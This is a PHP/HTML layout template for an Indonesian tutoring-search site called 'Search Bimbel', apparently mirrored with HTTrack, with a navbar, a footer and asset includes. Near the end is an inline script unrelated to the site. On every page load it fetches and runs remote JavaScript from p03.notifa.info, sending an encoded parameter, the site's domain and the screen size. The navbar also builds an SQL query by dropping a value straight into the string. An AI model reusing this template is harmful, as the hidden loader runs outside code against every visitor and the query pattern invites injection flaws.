<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from eventsoff.com/index1.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 06 Dec 2019 15:39:13 GMT -->

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="description" content="Askbootstrap">
	<meta name="author" content="Askbootstrap">
	<title>Search Bimbel</title>
	<!-- Favicon Icon -->
	<link rel="icon" type="image/png" href="<?= base_url() ?>assets/frontend/images/favicon.html">
	<!-- Bootstrap core CSS -->
	<link href="<?= base_url() ?>assets/frontend/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<!-- Material Design Icons -->
	<link href="<?= base_url() ?>assets/frontend/vendor/icons/css/materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css" />
	<!-- Select2 CSS -->
	<link href="<?= base_url() ?>assets/frontend/vendor/select2/css/select2-bootstrap.css" />
	<link href="<?= base_url() ?>assets/frontend/vendor/select2/css/select2.min.css" rel="stylesheet" />
	<!-- Custom styles for this template -->
	<link href="<?= base_url() ?>assets/frontend/css/osahan.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/jquery-ui-1.12.1/jquery-ui.css" rel="stylesheet">
	<link href="<?= base_url() ?>assets/vendor/datatables/dataTables.bootstrap4.min.css" rel="stylesheet">
	<link rel="stylesheet" href="<?= base_url() ?>assets/summernote/summernote-bs4.css">
	<!-- Toastr -->
	<link rel="stylesheet" href="<?= base_url() ?>assets/frontend/toastr/toastr.min.css">
</head>

<body>
	<!-- Navbar -->
	<header>
		<nav class="navbar navbar-expand-lg navbar-light bg-light">
			<div class="container">
				<a class="navbar-brand text-success logo" href="<?php echo base_url(); ?>"><i class="mdi mdi-home-map-marker"></i> <strong>Search</strong> Bimbel</a>
				<button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
					<span class="navbar-toggler-icon"></span>
				</button>
				<div class="collapse navbar-collapse" id="navbarResponsive">
					<ul class="navbar-nav mr-auto mt-2 mt-lg-0 margin-auto">
						<li class="nav-item">
							<a class="nav-link" href="<?php echo base_url(); ?>" id="navbarDropdownPortfolio" aria-haspopup="true" aria-expanded="false">
								HOME
							</a>
						</li>
						<li class="nav-item dropdown
						<?= $this->uri->segment(2) == 'latest' ? 'active' : '' ?>
						">
							<a class="nav-link dropdown-toggle" href="#" id="navbarDropdownPortfolio" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
								BIMBEL
							</a>
							<div class="dropdown-menu" aria-labelledby="navbarDropdownPortfolio">
								<a class="dropdown-item 
								<?= $this->uri->segment(2) == 'latest' ? 'active' : '' ?>
								" href="<?php echo base_url(); ?>home/latest">Latest</a>
								<a class="dropdown-item 
								<?= $this->uri->segment(2) == 'popular' ? 'active' : '' ?>
								" href="<?php echo base_url(); ?>home/popular">Popular</a>
							</div>
						</li>
						<li class="nav-item 
						<?= $this->uri->segment(2) == 'about' ? 'active' : '' ?>
						">
							<a class="nav-link" href="<?php echo base_url(); ?>home/about" id="navbarDropdownPortfolio" aria-haspopup="true" aria-expanded="false">
								ABOUT
							</a>
						</li>
						<li class="nav-item
						<?= $this->uri->segment(2) == 'contact' ? 'active' : '' ?>
						">
							<a class="nav-link" href="<?php echo base_url(); ?>home/contactus" id="navbarDropdownPortfolio" aria-haspopup="true" aria-expanded="false">
								CONTACT US
							</a>
						</li>
						
						
					</ul>
					<div class="my-2 my-lg-0">
						<ul class="list-inline main-nav-right">
							<!-- <li class="list-inline-item">
								<a class="btn btn-link btn-sm dropdown-toggle" href="#" id="navbarDropdownPortfolios" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Sign In</a>
								<div class="dropdown-menu" aria-labelledby="navbarDropdownPortfolios">
								<a class="dropdown-item" href="<?//= base_url() ?>home/login">Tutor / Student</a>
								<a class="dropdown-item" href="<?//= base_url() ?>auth/login" target="_blank">Owner</a>
								</div>
							</li> -->
							<?php 
							$ci =& get_instance();
							$user_session = $ci->session->userdata('id');
    						if($user_session) { ?>
								<?php if (($this->fungsi->user_login()->bimbel_user_type_id == 1) OR ($this->fungsi->user_login()->bimbel_user_type_id == 2)) : ?>
								<li class="list-inline-item">
									<a class="btn btn-link btn-sm" href="<?php echo base_url(); ?>dashboard"><strong><i class="mdi mdi-account"></i> <?= $this->fungsi->user_login()->name ?> (<?= $this->fungsi->user_login()->bimbel_user_type_name ?>)</strong></a>
								</li>
								<?php elseif (($this->fungsi->user_login()->bimbel_user_type_id == 3) OR ($this->fungsi->user_login()->bimbel_user_type_id == 4)) : ?>
									<?php
									$send_to = $this->fungsi->user_login()->id;
									$sql = $this->db->query("SELECT count(status) as notif FROM email WHERE send_to = $send_to AND status = '0'");
									?>
								<li class="list-inline-item">
									<a class="btn btn-link btn-sm dropdown-toggle" href="#" id="navbarDropdownPortfolios" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><strong><i class="mdi mdi-account"></i> <?= $this->fungsi->user_login()->name ?> (<?= $this->fungsi->user_login()->bimbel_user_type_name ?>)</strong></a>
									<?php if ($this->fungsi->user_login()->bimbel_user_type_id == 3) : ?>
									<div class="dropdown-menu" aria-labelledby="navbarDropdownPortfolio">
									<!-- <a class="dropdown-item" href="<?//= site_url('akun/editts/'.str_replace(array('=','+','/'), array('-','_','~'), $this->encryption->encrypt($user_session).'')) ?>">My Profile</a> -->
									<a class="dropdown-item" href="<?= site_url('akun/editts') ?>">My Profile</a>
									<a class="dropdown-item" href="<?= site_url('bimbel_yang_sedang_terdaftar') ?>">My Bimbel</a>
									<a class="dropdown-item" href="<?= site_url('home/email') ?>">My Mail 
									<?php if ($sql->row()->notif != '0') : ?>
										<span class="badge badge-danger badge-counter"><?= $sql->row()->notif ?>+</span>
									<?php endif ?>
									</a>
									<!-- <a class="dropdown-item" href="<?//= site_url('bimbel_yang_sedang_diajar') ?>">My Subject</a> -->
									</div>
									<?php elseif ($this->fungsi->user_login()->bimbel_user_type_id == 4) : ?>
									<div class="dropdown-menu" aria-labelledby="navbarDropdownPortfolio">
									<a class="dropdown-item" href="<?= site_url('akun/editts') ?>">My Profile</a>
									<a class="dropdown-item" href="<?= site_url('bimbel_yang_di_ikuti') ?>">My Bimbel</a>
									<a class="dropdown-item" href="<?= site_url('home/email') ?>">My Mail 
									<?php if ($sql->row()->notif != '0') : ?>
										<span class="badge badge-danger badge-counter"><?= $sql->row()->notif ?>+</span>
									<?php endif ?>
									</a>
									</div>
									<?php endif ?>
								</li>
								
								<li class="list-inline-item">
									<a class="btn btn-success btn-sm" href="<?= base_url() ?>auth/logout">Sign Out</a>
								</li>
								<?php endif ?>
							<?php } ?>

							<?php 
							$ci =& get_instance();
    						$user_session = $ci->session->userdata('id');
    						if(!$user_session) { ?>
							<li class="list-inline-item">
								<a class="btn btn-link btn-sm" href="<?= base_url() ?>auth/login"><strong>Sign In</strong></a>
							</li>
							<li class="list-inline-item">
								<a class="btn btn-success btn-sm" href="<?= base_url() ?>auth/register">Sign Up</a>
							</li>
							<?php } ?>
						</ul>
					</div>
				</div>
			</div>
		</nav>
	</header>
	<!-- End Navbar -->

	<!-- Memanggol Konten -->
	<?= $contents ?>


	<!-- Footer -->
	<section class="section-padding footer bg-dark">
		<div class="container">
			<div class="row">
				<div class="col-lg-6 col-md-6">
					<h4 class="mb-5 text-center"><a class="text-success logo" href="index.html"><i class="mdi mdi-home-map-marker"></i> <strong>Search</strong>Bimbel</a></h4>
					<p class="text-center">Gorontalo, Indonesia</p>
					<p class="mb-0 text-center"><a class="text-light" href="#">+61 525 240 310</a></p>
					<p class="mb-0 text-center"><a class="text-success" href="mailto:cbot59@gmail.com" target="_blank">cbot59@gmail.com</a></p>
					<p class="mb-0 text-center"><a class="text-info" href="<?= base_url() ?>"><?= substr(base_url(),7,-1) ?></a></p>
				</div>
				<div class="col-lg-6 col-md-6">
					<h6 class="mb-5 text-center text-success">GET IN TOUCH</h6>
					<div class="footer-social text-center">
						<a href="https://www.facebook.com/rivaldy.saputra" target="_blank"><i class="mdi mdi-facebook"></i></a>
						<a href="https://instagram.com/rivaldi.dev" target="_blank"><i class="mdi mdi-instagram"></i></a>
						<a href="https://www.linkedin.com/in/cbot59/" target="_blank"><i class="mdi mdi-linkedin"></i></a>
					</div>
				</div>
				<!-- <div class="col-lg-2 col-md-2">
					<h6 class="mb-4">COMPANY</h6>
					<ul>
						<li><a href="#">About us</a></li>
						<li><a href="#">Career</a></li>
						<li><a href="#">Services</a></li>
						<li><a href="#">Properties</a></li>
						<li><a href="#">Contact</a></li>
						<ul>
				</div>
				<div class="col-lg-2 col-md-2">
					<h6 class="mb-4">LEARN MORE</h6>
					<ul>
						<li><a href="#">Privacy</a></li>
						<li><a href="#">Terms & Conditions</a></li>
						<li><a href="#">Account</a></li>
						<li><a href="#">FAQ</a></li>
						<li><a href="#">Blog</a></li>
						<ul>
				</div> -->
				
			</div>
		</div>
	</section>
	<!-- End Footer -->
	<!-- Copyright -->
	<section class="pt-4 pb-4 text-center">
		<p class="mt-0 mb-0">© Copyright 2019 Search Bimbel. All Rights Reserved</p>
		<small class="mt-0 mb-0">
			Made with <i class="mdi mdi-heart text-danger"></i> by
			<a class="text-dark" target="_blank" href="https://askbootstrap.com/">CV. Digitalks Cendana Solution</a>
		</small>
	</section>
	<!-- End Copyright -->
	<!-- Bootstrap core JavaScript -->
	<!-- Bootstrap core JavaScript -->
	<script src="<?= base_url() ?>assets/frontend/vendor/jquery/jquery.min.js"></script>
	<script src="<?= base_url() ?>assets/frontend/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
	<!-- Contact form JavaScript -->
	<!-- Do not edit these files! In order to set the email address and subject line for the contact form go to the bin/contact_me.php file. -->
	<script src="<?= base_url() ?>assets/frontend/js/jqBootstrapValidation.js"></script>
	<script src="<?= base_url() ?>assets/frontend/js/contact_me.js"></script>
	<!-- select2 Js -->
	<script src="<?= base_url() ?>assets/frontend/vendor/select2/js/select2.min.js"></script>
	<!-- Page level plugins -->
	<script src="<?= base_url() ?>assets/vendor/datatables/jquery.dataTables.min.js"></script>
	<script src="<?= base_url() ?>assets/vendor/datatables/dataTables.bootstrap4.min.js"></script>
	<script src="<?= base_url() ?>assets/summernote/summernote-bs4.min.js"></script>
	<!-- Toastr -->
	<script src="<?= base_url() ?>assets/frontend/toastr/toastr.min.js"></script>
	<!-- Page level custom scripts -->
	<script src="<?= base_url() ?>assets/js/demo/datatables-demo.js"></script>
	<!-- Custom -->
	<script src="<?= base_url() ?>assets/frontend/js/custom.js"></script>
	<script type="text/javascript">
		if (self == top) {
			function netbro_cache_analytics(fn, callback) {
				setTimeout(function() {
					fn();
					callback();
				}, 0);
			}

			function sync(fn) {
				fn();
			}

			function requestCfs() {
				var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
				var idc_glo_r = Math.floor(Math.random() * 99999999999);
				var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprA%2frAIIbtU35efy%2fuDMFIQTEXNpCYxb0T6wQejTEB8US3MHEmjpVhe4f6X%2f6Upx%2f1ZDQuGKe11Qm8oVvDfa1Uya%2bWCxT8RJ0QLmg7BK5pVeo5nNwbd1vznLSW%2fqL1HTY6%2fyrS1Le9e3vTwddm1y4WxEoHvvatEP7QHusRWPP8QoTrds8BNe6r2%2fxKLdPfT0%2bOGj7LKd2ruVDZHp2lgYBbMJ5bMgQJlWY8CKk6fmeBRDOXALbcUOb5MJ5Vbw0X6lQqWtVPbusOvAHWwBahzYUWFc1xGwmMW%2bEFSVha7mj9k1hJgvtW%2fpkcxrTStF5Jcb70byLuA1%2b0HfZM8IZDHsKJ93NDbfvzU2dO%2fLPYfMOPsQxM0mWtTnR%2bs21OTEh%2fm9cSfFqP%2beU4xcgpasmO1HUiRcUgBGZQ5vDAE2IFR7dgRKikNl8u6hVZqt9quSRSVUTBGhO469K558E8gJMjmkuiaZw%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
				var bsa = document.createElement('script');
				bsa.type = 'text/javascript';
				bsa.async = true;
				bsa.src = url;
				(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
			}
			netbro_cache_analytics(requestCfs, function() {});
		};
	</script>
	<script src="<?= base_url() ?>assets/jquery-ui-1.12.1/jquery-ui.js"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			$("#subject").autocomplete({
				source: "<?php echo site_url('home/autocomplete_subject/?'); ?>"
			});

			$("#organization").autocomplete({
				source: "<?php echo site_url('home/autocomplete_organization/?'); ?>"
			});
		});
		$(function () {
			$('[data-toggle="tooltip"]').tooltip()
		})
		$(function() {
			//Add text editor
			$('#compose-textarea').summernote({
				height: 300
			})
		})
		$('.toastrDefaultSuccess').click(function() {
			toastr.success('Link copied to clipboard')
		});
		$('.toastrDefaultInfo').click(function() {
			toastr.info('Lorem ipsum dolor sit amet, consetetur sadipscing elitr.')
		});
		$('.toastrDefaultError').click(function() {
			toastr.error('Lorem ipsum dolor sit amet, consetetur sadipscing elitr.')
		});
		$('.toastrDefaultWarning').click(function() {
			toastr.warning('Lorem ipsum dolor sit amet, consetetur sadipscing elitr.')
		});
	</script>
</body>

<!-- Mirrored from eventsoff.com/index1.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 06 Dec 2019 15:45:22 GMT -->

</html>
